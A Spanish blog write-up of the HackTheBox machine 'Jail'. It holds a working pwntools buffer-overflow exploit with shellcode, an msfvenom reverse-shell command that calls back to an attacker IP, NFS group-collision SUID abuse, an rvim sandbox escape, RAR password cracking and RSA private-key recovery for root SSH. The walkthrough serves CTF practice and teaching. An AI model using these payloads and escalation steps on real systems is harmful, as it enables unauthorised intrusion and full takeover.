---
layout: post
title: HTB_Jail
date: 2023/07/10
slug: HTB_Jail
heroImage: /assets/machines.jpg
---

# Jail {-}

## Introduccion {-}

La maquina del dia se llama Jail.

El replay del live se puede ver aqui

[![S4vitaar Jail maquina](https://img.youtube.com/vi/IdFJ5vW_Enc/0.jpg)](https://www.youtube.com/watch?v=IdFJ5vW_Enc)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.34
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.34
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.34 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.34 -oN targeted
```


| Puerto | Servicio  | Que se nos occure? | Que falta? |
| ------ | --------- | ------------------ | ---------- |
| 22     | tcp       | Conneccion directa | creds      |
| 80     | http      | Web, Fuzzing       |            |
| 111    | rpcbind   |                    |            |
| 2049   | nfs       |                    |            |
| 7411   | daqstream |                    |            |
| 20048  | mountd    |                    |            |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.34
```

Es un Apache 2.4.6 en un CentOS. 


#### Checkear la web {-}

Si entramos en la url 
```bash
 http://10.10.10.34 
```
, Vemos la Apache2 default page.


#### Checkeando la cavezera con curl {-}

```bash
curl -s -X GET "http://10.10.10.34"
curl -s -X GET "http://10.10.10.34" -I
```

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.34/FUZZ
```

Vemos un directorio 
```bash
 /jailuser 
```
 que lista un directorio 
```bash
 dev 
```
 que contiene ficheros. Nos descargamos estos ficheros.


### Analysando el puerto 7411 {-}

```bash
nc 10.10.10.34 7411
```

Nos pone **send user command** pero no llegamos a ver nada por el momento.

### Analyzando el NFS {-}

Buscando por internet que es el NFS y de que manera podriamos scanear este servicio, vemos que funcciona
como recursos compartidos a nivel de red que podriamos scanear con la utilidad 
```bash
 showmount 
```
 y que podriamos
montar en nuestro equipo.

```bash
showmount -e 10.10.10.34
```

### Analysis de los ficheros descargados {-}

Hemos descargado 3 ficheros:

- jail
- jail.c
- compile.sh

El fichero 
```bash
 compile.sh 
```
 nos muestra de que manera compila el fichero jail.c para crear un binario jail de 32 bits y como lanza el servicio.

Miramos que typo de fichero y de seguridad lleva el fichero jail con:

```bash
chmod +x jail
file jail
checksec jail
```

Aqui vemos que este fichero es de 32 bits y vemos que no tiene ninguna proteccion como DEP o PIE.

Mirando el codigo del fichero 
```bash
 jail.c 
```
 vemos un print que nos dice **send user command** y que usa funcciones como 
```bash
 strcmp() 
```

que ya sabemos que son vulnerables.

Ahora que vemos por donde van los tiros y que esta maquina tocara un BOF, analyzamos las vulnerabilidades.
## Vulnerability Assessment {-}


### Buffer Overflow {-}

El codigo nos muestra que compara una String con un username 
```bash
 admin 
```
 y una contraseña 
```bash
 1974jailbreak! 
```
.
Vemos que hay una posibilidad de lanzar el binario en modo **Debug**. 

Vemos que una de estas comparativas va con una variable 
```bash
 userpass 
```
 que solo tiene un Buffer de 16 Bytes y 
que si lanzamos el binario en modo debug, nos printa la direccion memoria de esta variable.

Tambien vemos que el binario abre el puerto 7411 y lo comprobamos con 
```bash
 lsof 
```


```bash
lsof -i:7411
./jail
lsof -i:7411
```

#### Analyzando vulnerabilidades con gdb {-}

Lanzamos el binario con gdb

```bash
gdb ./jail
r
```

Y nos connectamos por el puerto 7411

```bash
nc localhost 7411
```

Vemos que el gdb  a creado un processo hijo de modo Detach que no seria la buena forma para tratar. Lo comprobamos 
colapsando el programa poniendo mas de 16 A en el password

```bash
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Aqui no vemos nada en el gdb. En estos casos tenemos que configurar una cosa para ver el flujo del processo hijo.

```bash
gdb ./jail
set detach-on-fork off
set follow-fork-mode child
r
```

Aqui ya estamos syncronizados con el processo hijo.

```bash
nc localhost 7411
OK Ready. Send USER command.
USER admin
OK Send PASS command.
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Intentamos el modo debug 

```bash
nc localhost 7411
OK Ready. Send USER command.
DEBUG
OK DEBUG mode on.

USER admin
OK Send PASS command.
PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Debug: userpass buffer @ 0xffffd140
```

Vemos la direccion de la variable userpass y si repetimos la movida multiples vecez, vemos que la direccion no cambia.
Ademas, ya vemos que sobre escribimos registros con A y desde aqui seguimos la guia de un BOF

1. Buscamos Ganar el control del **eip** 

    - creamos un pattern de 150 caracteres
    
        ```bash
        gef➤ pattern create 150
        [+] Generating a pattern of 150 bytes (n=4)
        aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
        [+] Saved as '$_gef0'
        ```

    - lanzamos el script otra vez y pegamos los caracteres

        ```bash
        nc localhost 7411
        OK Ready. Send USER command.
        USER admin
        OK Send PASS command.
        PASS aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
        ```

    - el programa peta una vez mas pero el valor del 
```bash
 $eip 
```
 a cambiado. Miramos el offset con el commando

        ```bash
        gef➤  pattern offset $eip
        [+] Searching for '$eip'
        [+] Found at offset 28 (little-endian search) likely
        ``` 

        Aqui vemos que tenemos que entrar 28 caracteres antes de sobre escribir el **eip**.

    - Probamos con 28 A y 4 B.

        ```bash
        python -c '28*"A"+4*"B"'
        AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

        nc localhost 7411
        OK Ready. Send USER command.
        USER admin
        OK Send PASS command.
        PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
        ```

    - añadimos 4 C para saber donde caen la cosas despues del **eip**

        ```bash
        python -c '28*"A"+4*"B"+8*"C"'
        AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCC

        nc localhost 7411
        OK Ready. Send USER command.
        USER admin
        OK Send PASS command.
        PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCC
        ```

1. Miramos lo que hay en la direccion de la variable userpass

    - lo miramos en forma normal

        ```bash
        gef➤  x/s 0xffffd140
        #Output
        0xffffd140: 'A' <repeats 28 times>, "BBBBCCCCCCCC"
        ```

    - lo miramos en forma hexadecimal
    
        ```bash
        gef➤  x/16wx 0xffffd140
        #Output
        0xffffd140  0x41414141  0x41414141  0x41414141  0x41414141
        0xffffd150  0x41414141  0x41414141  0x41414141  0x42424242
        0xffffd160  0x43434343  0x43434343  0x00000100  0xf7ff4070
        0xffffd170  0x00000001  0xf7ffd590  0x00000000  0x414112db
        ``` 

Aqui vemos que la direccion 
```bash
 0xffffd140 
```
 apunta al principio del Buffer (la entrada del usuario). Esto significa
que si el **eip** apunta a la direccion 
```bash
 0xfffd140 
```
 sumada por 32 bytes (que serian las 28 A mas los 4 bytes del **eip**),
podriamos ejecutar el shellcode que queremos.


![Jail-Buffer-shellcode-os](/assets/images/Jail-Buffer-shellcode-pos.png) 
Para esto nos creamos un script en python

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='i386')

p = remote("127.0.0.1", 7411)
# p = remote("10.10.10.34", 7411)


buf = b"\xdb\xc8\xd9\x74\x24\xf4\x5e\xbb\xc5\x90\x9f\x66\x33"
buf += b"\xc9\xb1\x12\x83\xee\xfc\x31\x5e\x13\x03\x9b\x83\x7d"
buf += b"\x93\x12\x7f\x76\xbf\x07\x3c\x2a\x2a\xa5\x4b\x2d\x1a"
buf += b"\xcf\x86\x2e\xc8\x56\xa9\x10\x22\xe8\x80\x17\x45\x80"
buf += b"\x18\xe2\xbb\x58\x75\xf0\xc3\x59\x3e\x7d\x22\xe9\x26"
buf += b"\x2e\xf4\x5a\x14\xcd\x7f\xbd\x97\x52\x2d\x55\x46\x7c"
buf += b"\xa1\xcd\xfe\xad\x6a\x6f\x96\x38\x97\x3d\x3b\xb2\xb9"
buf += b"\x71\xb0\x09\xb9"

before_eip = ("A" * 28).encode()
EIP = p32(0xffffd140+32)
after_eip = buf

p.recvuntil("OK Ready. Send USER command.")
p.sendline("USER admin")
p.recvuntil("OK Send PASS command.")
p.sendline("PASS ".encode() + before_eip + EIP + after_eip)
```

> [ ! ] NOTAS: el shellcode a sido creado con el comando 
```bash
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.8 LPORT=443 -b "\x00\x0a" -f python 
```
. Los badchars
aqui son los que ponemos siempre.

Ahora testeamos el script

1. Lanzamos el jail

    ```bash
    ./jail
    ```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Lanzamos el script en python

    ```bash
    python3 exploit.py
    ```

En este caso no funcciona y tito nos adelanta que el problema viene que de vez en cuando, el espacio del shellcode sobrepasa el limite de caracteres que podemos injectar, 
o mejor dicho es demasiado grande. Esta limitacion puede ser bypasseada por una tecnica llamada **reuse addr** explicada en la web de [rastating](https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/).
La tecnica consiste en utilizar methodos **send** o **recv** del socket de coneccion para ganar espacio para el shellcode.

Si buscamos por shellcode re-use en [exploit-db](https://www.exploit-db.com/shellcodes/34060), podemos encontrar shellcode que crearian un 
```bash
 /bin/bash 
```


Modificamos el shellcode del exploit.py y ganamos accesso a la maquina victima

## Vuln exploit & Gaining Access {-}

### Ganando accesso con el bufferoverflow {-}

1. Lanzamos el debug mode para recuperar la direccion del buffer

    ```bash
    nc 10.10.10.34 7411
    OK Ready. Send USER command.
    DEBUG
    OK DEBUG mode on.
    USER admin
    OK Send PASS command.
    PASS admin
    Debug: userpass buffer @ 0xffffd140
    ```

1. Modificamos el script en python

    ```python
    #!/usr/bin/python3

    from pwn import *

    context(os='linux', arch='i386')

    # p = remote("127.0.0.1", 7411)
    p = remote("10.10.10.34", 7411)

    buf = b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
    buf += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
    buf += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
    buf += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
    buf += b"\x89\xe3\x31\xc9\xcd\x80"


    before_eip = ("A" * 28).encode()
    EIP = p32(0xffffd140+32)
    after_eip = buf

    p.recvuntil("OK Ready. Send USER command.")
    p.sendline("USER admin")
    p.recvuntil("OK Send PASS command.")
    p.sendline("PASS ".encode() + before_eip + EIP + after_eip)

    p.interactive()
    ```

1. Lanzamos el script en python

    ```bash
    python3 exploit.py
    ```


Ya hemos ganado acceso al systema como el usuario **nobody** pero no podemos leer la flag y nos tenemos que convertir en el usuario frank.

### User pivoting {-}

```bash
id
sudo -l
```

Vemos que podemos lanzar el script 
```bash
 /opt/logreader/logreader.sh 
```
 como el usuario frank sin proporcionar contraseña.

```bash
cat /opt/logreader/logreader.sh
sudo -u frank /opt/logreader/logreader.sh
which strace
which ltrace
which checkproc
```

Vemos que podemos lanzar el script pero no sabemos exactamente lo que hace y no lo podemos debuggear. 

Miramos a los recursos compartidos **nfs** de la maquina

```bash
cat /etc/exports
```

Nos creamos dos monturas en nuestra maquina de atacante

```bash
mkdir /mnt/{opt,var}
cd /mnt
mount -t nfs 10.10.10.34:/opt /mnt/opt
mount -t nfs 10.10.10.34:/var/nfsshare /mnt/var
ls -l
ls -l opt/
ls -l opt/logreader
ls -l opt/rh
ls -l var/
```

Aqui vemos que no tenemos derechos de lectura ni de escritura sobre el directorio opt y var pero algo que nos llama la atencion son los user y groups asignados a estos 
directorios, sobre todo el directorio var que se nos aparece como estando del grupo docker.

```{r, echo = FALSE, fig.cap="groups nfs share folders", out.width="90%"}
    knitr::include_graphics("images/Jail-lla.png")
hay una colision entre los dos grupos y que como usuario del grupo docker en nuestra maquina de atacante, podemos crear ficheros como el usuario franck de la
![Jail-lla](/assets/images/Jail-lla.png) 
maquina victima

> [ ! ] NOTAS: Si no existe docker en nuestra maquina de atacante, tendriamos que ver el numero 1000 y tendriamos que crear un grupo con este id para operar

1. Creamos un fichero en C en el directorio 
```bash
 /mnt/var 
```


    ```bash
    #include <unistd.h>
    #include <stdio.h>

    int main(){
        setreuid(1000, 1000);
        system("/bin/bash");
        return 0;
    }
    ```

1. Compilamos el script

    ```bash
    gcc shell.c -o shell
    ```

1. Cambiamos el grupo y ponemos derechos SUID al binario

    ```bash
    chgrp 1000 shell
    chmod u+s shell
    ```

1. lanzamos el script desde la maquina victima

    ```bash
    ./shell
    whoami
    #Output
    frank
    ```

Ya podemos leer la flag.

> [ ! ] NOTAS: como la reverse shell no es la mejor del mundo, aqui nos podriamos crear una id_rsa y copiarla en el authorized_keys del usuario Frank para
conectarnos por ssh y obtener una mejor shell.## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
sudo -l
```

Aqui vemos que podriamos ejecutar el 
```bash
 /usr/bin/rvim 
```
 del fichero 
```bash
 /var/www/html/jailuser/dev/jail.c 
```
 como el usuario adm sin proporcionar contraseña.

```bash
sudo -u adm /usr/bin/rvim /var/www/html/jailuser/dev/jail.c

:!/bin/sh
#Output 
No se permite orden de consola en rvim

:set shell = /bin/bash
:shell
```

Aqui vemos que no podemos ejecutar comandos pero lo bueno es que rvim permite ejecutar codigo en python

```bash
:py import pty;pty.spawn("/bin/bash")
whoami 
#Output
adm
```

Aqui vemos que estamos en el directorio 
```bash
 /var/adm 
```


```bash
ls -la
cd .keys
ls -la
cat note.txt
```

Vemos un mensaje del Administrator a frank diciendole que su contraseña para encryptar cosas tiene que ser sur segundo nombre seguido de 4 digitos y un simbolo.

```bash
cd .local
ls -la
cat .frank
#Output
Szszsz! Mlylwb droo tfvhh nb mvd kzhhdliw! Lmob z uvd ofxpb hlfoh szev Vhxzkvw uiln Zoxzgiza zorev orpv R wrw!!!
```

Lanzamos la web de [quipqiup](https://www.quipqiup.com/) y copiamos el mensaje y nos lo traduce por 
**Hahaha! Nobody will guess my new password! Only a few lucky souls have Escaped from Alcatraz alive like I did!!!**

Tambien hay un 
```bash
 keys.rar 
```
.

Lo codificamos en base64 y nos lo tranferimos a nuestra maquina de atacante.

```bash
base64 -w 0 keys.rar; echo
```

y desde la maquina de atacante no copiamos el base64 y lo decodificamos

```bash
echo "hash de base64" | base64 -d > keys.rar
unrar x keys.rar
```

Aqui nos pide una contraseña para unrarear el 
```bash
 keys.rar 
```
 y buscando por internet Alcatraz Escape vemos que un Frank Morris se escapo de Alcatraz en 1962.
Vamos a tirar de la utilidad de crunch para crackear la contraseña.

```bash
crunch 11 11 -t Morris1962^ > passwords
rar2john keys.rar > hash
john --wordlist=passwords hash
```

Encontramos la contraseña 
```bash
 Morris1962! 
```


```bash
unrar x keys.rar
Password: Morris1962!
mv rootauthorizedsshkey.pub id_rsa.pub
cat id_rsa.pub
```

aqui vemos la key publica del usuario root, pero no podemos hacer gran cosa con la key publica. Como no parece muy grande, intentamos ver si podemos computar la llave
privada des esta key.

```python
python3

from Crypto.PublicKey import RSA
f = open ("id_rsa.pub", "r")
key = RSA.importKey(f.read())
print(key.n)
print(key.p)
print(key.q)
print(key.e)
```

Aqui como 
```bash
 key.n 
```
 es demasiado grande, no a sido posible computar 
```bash
 key.p 
```
 o 
```bash
 key.q 
```
 que nos ubiera permitido intentar generar una private key.

Miramos si podemos hacerlo desde [factordb](http://factordb.com/) pero es lo mismo. Pero existen webs para los ctf como [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
que podemos usar.

```bash
git clone https://github.com/Ganapati/RsaCtfTool
cd RsaCtfTool
python3 RsaCtfTool.py --publickey id_rsa.pub --private
```

Esperamos un poco y podemos ver la id_rsa. Lo copiamos en un ficher id_rsa y nos conectamos por ssh.

```bash
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@10.10.10.34
```

Ya somos root y podemos leer la flag.
